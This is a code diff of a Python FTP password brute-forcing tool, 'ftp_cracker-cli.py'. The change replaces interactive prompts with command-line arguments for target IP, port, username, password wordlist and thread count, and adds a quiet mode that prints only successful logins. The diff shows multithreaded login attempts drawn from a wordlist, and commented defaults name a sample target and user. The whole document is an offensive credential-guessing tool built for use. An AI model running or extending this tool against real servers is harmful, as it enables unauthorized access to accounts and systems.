@@ -7,58 +7,80 @@
 import ftplib
 import threading
 import time
+import argparse
 
 # target = "192.168.61.128"
 # port = 21
 # thread_count = 10000
 # passFile = r"E:\CyberSec\Wordlists\Top3575-probable.txt"
 # user = "argen"
+# try:
+parser = argparse.ArgumentParser()
+parser.add_argument('-t', '--target', help="target ip address")
+parser.add_argument('-p', '--port', help="target port")
+parser.add_argument('-u', '--user', help="target user")
+parser.add_argument('-P', '--passlist', help="password file")
+parser.add_argument('-T', '--threads', help="maximum thread count")
+parser.add_argument('--clean',action="store_true" , help="only print success login, running silently")
+args = parser.parse_args()
+
+# validate all needed arguments are present
+if not (args.target and args.port and args.user and args.passlist):
+    print("Missing needed arguments")
+    print("Usage: ftp_cracker-cli.py -t <IP> -p <port> -u <user> -P <password file> [--clean]")
+    exit()
+
+# validate target
+target = args.target
+if len(target.split(".")) != 4:
+    print("target IP is invalid.. enter a proper IPv4 IP as a target")
+    exit()
+for octet in target.split("."):
+    if not octet.isdigit():
+        print("target IP is invalid.. enter a proper IPv4 IP as a target")
+        exit()
+
+# validate port and convert to int
+port = args.port
+if not port.isdigit():  # python magics
+    port = input("Invalid Port Number (1 - 65535)")
+    exit()
+if not 0 < int(port) < 65535:
+    port = input("Invalid Port Number (1 - 65535)")
+    exit()
+port = int(port)
+
+# validate thread count and convert to int
+if args.threads:
+    thread_count = args.threads
+else:
+    thread_count = 1
+if not 0 < int(thread_count) < 9999999:
+    print("Dont be absurd... put a normal number of threads (I recommend between 1 and a million)")
+    exit()
+thread_count = int(thread_count)
+
+# validate file exists without importing os because i keep forgetting about it and i already wrote this section
+passFile = args.passlist
 try:
-    # validate target
-    target_valid = False
-    while not target_valid:
-        target = input("Enter IPv4 Address ( x.x.x.x | x.isdigit() == True ) ")
-        if len(target.split(".")) != 4:
-            target_valid = False
-            continue
-        for octet in target.split("."):
-            if not octet.isdigit():
-                target_valid = False
-                continue
-        target_valid = True  # reaching her means target is a valid IPv4 Address
+    open(passFile, 'x')
+    print("invalid path to password file. make sure you typed it correctly")
+    exit()  # This means file did not exit and was created
+except FileExistsError:
+     pass  # This is good! x doesnt overwrite and throws error on existing
 
-    # validate port
-    port = input("Enter Port Number (1 - 65535) ")
-    while not port.isdigit():  # python magics
-        port = input("Enter Port Number again (1 - 65535) ")
-    while not 0 < int(port) < 65535:
-        port = input("Enter Port Number again (1 - 65535) ")
-    port = int(port)
+user = args.user
 
-    # validate thread count
-    thread_count = input("Enter the amount of threads (if you put many, after it stops try grepping for \"success\") ")
-    while not thread_count.isdigit():
-        thread_count = input("Dont be absurd... put a normal number of threads (I recommend between 1 and a million) ")
-    while not 0 < int(thread_count) < 9999999:
-        thread_count = input("Dont be absurd... put a normal number of threads (I recommend between 1 and a million) ")
-    thread_count = int(thread_count)
+if args.clean:
+    verbose = False
+else:
+    verbose = True
 
-    # validate file exists without importing os because i keep forgetting about it and i already wrote this section
-    passFile = input("Enter path to password file ")
-    valid_passfile = False
-    while not valid_passfile:
-        try:
-            open(passFile, 'x')
-            valid_passfile = False
-            passFile = input("invalid path to password file make sure you type it correctly this time ")
-        except FileExistsError:
-            valid_passfile = True
+killswitch = False  # global killswitch to stop spawning threads. Can break the main loop from within an individual thread
+ftp = ftplib.FTP()
 
-    user = input("Enter Username ")
-    killswitch = False  # global killswitch to stop spawning threads. Can break the main loop from within an individual thread
-    ftp = ftplib.FTP()
-except Exception as e:
-    print(f"something went wrong: {e}")
+# except Exception as e:
+#     print(f"something went wrong: {e}")
 
 # make a new ftp object connect with it and login with it for every function call. if found calls global killswitch.
 def login(user, passwd, line):
@@ -76,7 +98,8 @@ def login(user, passwd, line):
         return True
 
     except:
-        print(f"line {line} fail - user:{user}, pass:{passwd}")
+        if verbose:
+            print(f"line {line} fail - user:{user}, pass:{passwd}")
         return False
 
 # for each line in a password file, spawn a thread calling ftplogin() while monitoring thread count and the killswitch
